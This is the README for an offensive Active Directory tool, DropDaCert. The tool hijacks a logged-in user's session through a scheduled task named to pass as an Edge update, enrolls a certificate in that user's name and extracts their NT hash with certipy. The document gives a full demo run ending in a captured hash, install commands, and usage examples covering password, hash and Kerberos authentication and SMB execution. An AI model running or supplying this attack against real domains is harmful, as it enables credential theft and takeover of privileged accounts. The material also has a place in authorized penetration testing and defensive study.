# DropDaCert

ADCS certificate theft via scheduled task session hijacking.

Drops a scheduled task on a target that runs in an active user's session context (`InteractiveToken`), enrolls a certificate via `certreq`, exports the PFX, and runs `certipy auth` to extract the NT hash.

```
┌──(kali㉿kali)-[~/DropDaCert]
└─$ python3 DropDaCert.py administrator:'P@ssw0rd'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1

  DropDaCert v2.0

  [+] Resolving target: 10.0.0.5
  [+] Target: SRV01.corp.local (10.0.0.5)
  [+] Connecting via WinRM (NTLM)...
  [+] Connected

  #    State    Session              User
  ---- -------- -------------------- ------------------------------
  0    Active   rdp-tcp#0            CORP\jsmith
  1    Active   rdp-tcp#1            CORP\admin-da

  [?] Pick session # to target: 1

  [+] Target session: CORP\admin-da (session 3, Active)
  [+] Payload uploaded
  [+] Task 'MicrosoftEdgeUpdateCore' created
  [+] Task triggered
  [+] Waiting for PFX (timeout: 90s)...........
  [+] PFX saved: output/cert.pfx (3286 bytes)

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'admin-da@corp.local'
[*] Using principal: 'admin-da@corp.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'admin-da.ccache'
[*] Trying to retrieve NT hash for 'admin-da'
[*] Got hash for 'admin-da@corp.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

## Install

```bash
git clone https://github.com/mattmillen15/DropDaCert.git && cd DropDaCert
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
curl -sL https://raw.githubusercontent.com/sensepost/susinternals/main/psexecsvc.py -o psexecsvc.py
```

This installs [certipy](https://github.com/ly4k/Certipy) and [psexecsvc](https://github.com/sensepost/susinternals) (needed for `--exec-method smb`).

## Usage

```
DropDaCert [[domain/]username[:password]@]target -ca HOST\CA -dc DC_IP [options]
```

### Examples

```bash
# Password auth, interactive session picker
DropDaCert administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1

# Target a specific user
DropDaCert administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1 -tu jsmith

# Domain auth
DropDaCert corp.local/admin:'Pass'@server01 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1

# NTLM hash
DropDaCert administrator@10.0.0.5 -H :abc123def... -ca 'CA01\CA' -dc 10.0.0.1

# Kerberos
DropDaCert corp.local/admin:'Pass'@server01 -k -ca 'CA01\CA' -dc 10.0.0.1

# Kerberos with ccache
export KRB5CCNAME=admin.ccache
DropDaCert corp.local/admin@server01 -k -ca 'CA01\CA' -dc 10.0.0.1

# SMB exec (no WinRM needed)
DropDaCert admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method smb

# Manual mode — generate files and print instructions only
DropDaCert admin@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method manual -tu jsmith

# Non-admin target (C:\Users\Public + cmd wrapper)
DropDaCert admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv \
  --drop-dir 'C:\Users\Public' --exec-wrapper cmd
```

### Options

| Flag | Description |
|------|-------------|
| `-ca HOST\CA` | CA config string (required) |
| `-dc IP` | Domain controller IP (required) |
| `-tu USER` | Target user (skip session picker) |
| `-H [LM:]NT` | NTLM hash |
| `-k` | Kerberos auth |
| `--aes-key HEX` | AES key for Kerberos |
| `--exec-method` | `winrm` (default), `smb`, `manual` |
| `--exec-wrapper` | `conhost` (default), `cmd`, `powershell`, `wscript` |
| `--drop-dir` | Remote drop directory (default: `C:\Windows\Tasks`) |
| `--template` | Certificate template (default: `User`) |
| `--timeout` | PFX wait timeout in seconds (default: 90) |
| `--ldap-shell` | LDAP shell via certipy instead of NT hash |
| `--no-cleanup` | Leave files and task on target |

## How it works

1. Connects via WinRM (default) or SMB (psexecsvc)
2. Enumerates active sessions and resolves domain via WMI
3. Uploads `cert.inf`, `cert.bat`, `cert.xml` via SMB
4. Creates scheduled task with `InteractiveToken` — runs in the target user's live session
5. `cert.bat` runs `certreq` to enroll, exports PFX with empty password
6. Polls for PFX via SMB, downloads it
7. Runs `certipy auth` to extract NT hash
8. Cleans up remote files and task

## Credits

- Technique from [NetExec PR #908](https://github.com/Pennyw0rth/NetExec/pull/908) by [@Dfte](https://github.com/Dfte)
- SMB execution via [susinternals](https://github.com/sensepost/susinternals) by [@sensepost](https://github.com/sensepost)
- Certificate auth via [Certipy](https://github.com/ly4k/Certipy) by [@ly4k](https://github.com/ly4k)
